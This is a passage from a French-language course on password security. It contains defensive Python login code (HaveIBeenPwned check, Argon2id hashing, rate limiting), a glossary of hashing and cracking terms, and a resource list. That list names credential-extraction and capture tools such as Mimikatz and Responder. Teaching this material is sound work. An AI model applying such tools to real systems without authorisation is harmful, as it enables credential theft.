        r = requests.get(f"https://api.pwnedpasswords.com/range/{prefix}", timeout=5)
        for line in r.text.splitlines():
            h, count = line.split(':')
            if h == suffix:
                return int(count)
    except requests.RequestException:
        pass  # En cas d'erreur réseau, ne pas bloquer l'inscription
    return 0

def is_rate_limited(username: str) -> bool:
    """Vérifie si l'utilisateur est rate-limité."""
    now = time.time()
    # Nettoyer les tentatives expirées
    attempt_tracker[username] = [
        t for t in attempt_tracker[username] 
        if now - t < WINDOW_SECONDS
    ]
    return len(attempt_tracker[username]) >= MAX_ATTEMPTS

def register(username: str, password: str) -> dict:
    """Enregistre un utilisateur avec un mot de passe sécurisé."""
    # Vérifications
    if len(password) < 8:
        return {"success": False, "error": "Mot de passe trop court (minimum 8 chars)"}
    
    if username in users_db:
        return {"success": False, "error": "Utilisateur déjà existant"}
    
    # Vérification HaveIBeenPwned
    count = check_pwned(password)
    if count > 0:
        return {
            "success": False, 
            "error": f"Mot de passe compromis (trouvé {count}x dans des fuites). Choisissez-en un autre."
        }
    
    # Hachage Argon2id
    hash_value = ph.hash(password)
    users_db[username] = {"hash": hash_value, "created_at": datetime.utcnow().isoformat()}
    
    log_event("REGISTER_SUCCESS", username, True)
    return {"success": True, "message": "Compte créé"}

def authenticate(username: str, password: str) -> dict:
    """Authentifie un utilisateur."""
    # Rate limiting
    if is_rate_limited(username):
        log_event("LOGIN_BLOCKED_RATELIMIT", username, False)
        return {"success": False, "error": "Trop de tentatives. Réessayez dans 5 minutes."}
    
    if username not in users_db:
        attempt_tracker[username].append(time.time())
        log_event("LOGIN_FAILURE_UNKNOWN_USER", username, False)
        return {"success": False, "error": "Identifiants incorrects"}  # Message générique
    
    try:
        ph.verify(users_db[username]["hash"], password)
        # Succès — réinitialiser le compteur
        attempt_tracker[username] = []
        log_event("LOGIN_SUCCESS", username, True)
        return {"success": True, "message": "Authentification réussie"}
    except VerifyMismatchError:
        attempt_tracker[username].append(time.time())
        remaining = MAX_ATTEMPTS - len(attempt_tracker[username])
        log_event("LOGIN_FAILURE_WRONG_PASSWORD", username, False)
        return {"success": False, "error": f"Identifiants incorrects. {remaining} tentatives restantes."}

def log_event(event_type: str, username: str, success: bool):
    """Log structuré des événements d'authentification."""
    event = {
        "timestamp": datetime.utcnow().isoformat(),
        "event": event_type,
        "username": username,
        "success": success
    }
    print(json.dumps(event))

if __name__ == "__main__":
    print(register("alice", "password"))         # Bloqué : compromis
    print(register("alice", "Xr7!mP9@qLk3#nVw")) # Succès
    print(authenticate("alice", "wrong"))         # Échec
    print(authenticate("alice", "Xr7!mP9@qLk3#nVw"))  # Succès
```

---

## 12. Glossaire

| Terme | Définition |
|-------|------------|
| **Hash** | Empreinte numérique de taille fixe produite par une fonction de hachage |
| **Digest** | Synonyme de hash, utilisé dans les spécifications cryptographiques |
| **Salt** | Valeur aléatoire unique ajoutée à chaque mot de passe avant hachage |
| **Rainbow Table** | Table précalculée de correspondances hash ↔ préimage |
| **Wordlist** | Fichier texte contenant une liste de mots de passe candidats |
| **Rule-based** | Attaque qui applique des transformations à une wordlist |
| **Mask** | Pattern de charset et longueur pour une attaque de force brute ciblée |
| **NTLM** | Protocole d'authentification Windows, hash dérivé de MD4 |
| **WPA2 Handshake** | Échange cryptographique capturé lors d'une connexion WiFi |
| **Argon2id** | Algorithme gagnant du PHC 2015, recommandé OWASP pour les mots de passe |
| **bcrypt** | Algorithme de hachage adaptatif pour mots de passe, facteur de coût exponentiel |
| **PBKDF2** | Password-Based Key Derivation Function 2, itère SHA-x N fois |
| **k-Anonymity** | Technique de requête préservant la vie privée (ex. HaveIBeenPwned) |
| **Pass-the-Hash** | Attaque utilisant le hash sans connaître le mot de passe clair |
| **Cracking** | Processus de retrouver un mot de passe depuis son hash |
| **MFA/2FA** | Multi-Factor Authentication, deuxième facteur d'authentification |
| **TOTP** | Time-based One-Time Password, code à usage unique basé sur le temps |
| **FIDO2** | Standard d'authentification sans mot de passe (clés matérielles) |

---

## Ressources complémentaires

- **Cours Holberton connexes :** Cryptographie symétrique et asymétrique, Sécurité réseau (TLS/SSL), Capture de trafic réseau (Wireshark), Active Directory et attaques Kerberos
- **Outils à approfondir :** Mimikatz (extraction de hashes Windows), Impacket (attaques réseau), Responder (capture NTLMv2), Hashcat utils (hcxtools, cap2hccapx)
- **Ressources légales de pratique :** Hack The Box, TryHackMe, VulnHub, PortSwigger Web Security Academy
- **Documentation officielle :** OWASP Password Storage Cheat Sheet, NIST SP 800-63B, RFC 9106 (Argon2)
- **Bases de données de hashes connus :** CrackStation (free lookup), Hashes.com
